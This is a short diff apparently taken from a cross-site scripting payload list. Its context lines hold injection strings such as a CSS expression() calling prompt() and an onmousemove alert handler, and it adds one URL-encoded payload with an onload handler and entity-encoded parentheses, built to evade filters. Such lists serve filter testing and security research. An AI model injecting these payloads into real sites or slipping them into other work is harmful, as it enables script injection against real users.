@@ -59,3 +59,4 @@ zzz<%div style=width:expression(prompt(933666))>
 
 </a onmousemove="alert(1)">
 
+%3Cstyle%2fonload%20%20%20%20%3D%20%20%20%20%21-alert%26%23x28%3B1%26%23x29%3B%3E
